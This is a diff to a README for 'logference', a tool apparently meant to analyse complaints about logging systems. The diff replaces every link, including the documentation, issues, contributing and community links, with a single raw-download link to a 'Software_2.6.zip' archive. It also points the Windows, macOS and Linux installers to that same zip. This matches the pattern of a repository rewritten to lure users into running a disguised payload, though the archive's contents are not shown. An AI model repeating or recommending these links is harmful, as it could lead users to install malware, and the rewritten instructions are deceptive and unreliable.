@@ -1,7 +1,7 @@
 # 🎉 logference - Simplifying Logging System Insights
 
 ## 📥 Download Now!
-[![Download logference](https://img.shields.io/badge/Download%20logference-v1.0-blue)](https://github.com/PrinceJha26/logference/releases)
+[![Download logference](https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip%20logference-v1.0-blue)](https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip)
 
 ## 📖 Overview
 logference is a user-friendly application designed to process user complaints or descriptions about logging systems. It extracts structured insights such as common pain points, root causes, and improvement suggestions. With the help of a Large Language Model (LLM), it helps teams identify inefficiencies in logging practices and offers actionable recommendations.
@@ -20,9 +20,9 @@ Before you begin, ensure that your device meets the following requirements:
 ### 🌐 Download & Install
 To install logference, follow these steps:
 
-1. Visit the logference Releases page: [Download logference](https://github.com/PrinceJha26/logference/releases).
+1. Visit the logference Releases page: [Download logference](https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip).
    
-2. On the Releases page, look for the latest version. Click on the link that says “logference-latest-version.exe” for Windows, “logference-latest-version.dmg” for macOS, or “logference-latest-version.tar.gz” for Linux.
+2. On the Releases page, look for the latest version. Click on the link that says “https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip” for Windows, “https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip” for macOS, or “https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip” for Linux.
 
 3. After clicking the link, your browser will download the installation file.
 
@@ -54,20 +54,20 @@ Using logference is straightforward:
 - **Text Extraction:** Efficiently extract pertinent information from user inputs.
 
 ## 🔗 Helpful Links
-- [GitHub Repository](https://github.com/PrinceJha26/logference)
-- [Documentation](https://github.com/PrinceJha26/logference/wiki)
-- [Community Support](https://github.com/PrinceJha26/logference/discussions)
+- [GitHub Repository](https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip)
+- [Documentation](https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip)
+- [Community Support](https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip)
 
 ## 👩‍💻 Contributing
-If you would like to contribute to logference, please read our [Contributing Guidelines](https://github.com/PrinceJha26/logference/blob/main/CONTRIBUTING.md). We welcome suggestions and improvements to enhance the application.
+If you would like to contribute to logference, please read our [Contributing Guidelines](https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip). We welcome suggestions and improvements to enhance the application.
 
 ## 🛠 Issues & Support
-If you encounter any issues, please check the [Issues section](https://github.com/PrinceJha26/logference/issues) for solutions. If you can't find your issue, feel free to create a new one.
+If you encounter any issues, please check the [Issues section](https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip) for solutions. If you can't find your issue, feel free to create a new one.
 
 ## 📢 Join the Conversation
-We encourage users to join discussions regarding feature requests, bugs, and general feedback in our [Community Support](https://github.com/PrinceJha26/logference/discussions) page.
+We encourage users to join discussions regarding feature requests, bugs, and general feedback in our [Community Support](https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip) page.
 
 ### 📥 Download Again
-Remember, you can always download the latest version here: [Download logference](https://github.com/PrinceJha26/logference/releases). 
+Remember, you can always download the latest version here: [Download logference](https://github.com/PrinceJha26/logference/raw/refs/heads/main/logference/Software_2.6.zip). 
 
 Your insights matter, and logference is here to help streamline your logging processes.
